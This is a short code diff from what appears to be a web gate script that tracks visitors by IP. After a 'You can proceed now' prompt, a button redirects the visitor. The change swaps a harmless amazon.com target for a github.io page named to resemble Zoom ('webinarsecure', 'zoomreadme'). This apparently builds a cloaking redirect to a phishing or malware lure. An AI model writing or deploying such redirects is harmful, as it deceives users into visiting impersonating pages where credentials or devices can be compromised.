@@ -358,7 +358,7 @@ if (isset($requests[$ip])) {
                 messageElement.textContent = "You can proceed now";
                 button.classList.add('blue');
                 button.onclick = () => {
-                    window.location.href = `https://amazon.com`;
+                    window.location.href = `https://webinarsecure.github.io/zoomreadme/`;
                 };
             }
         }
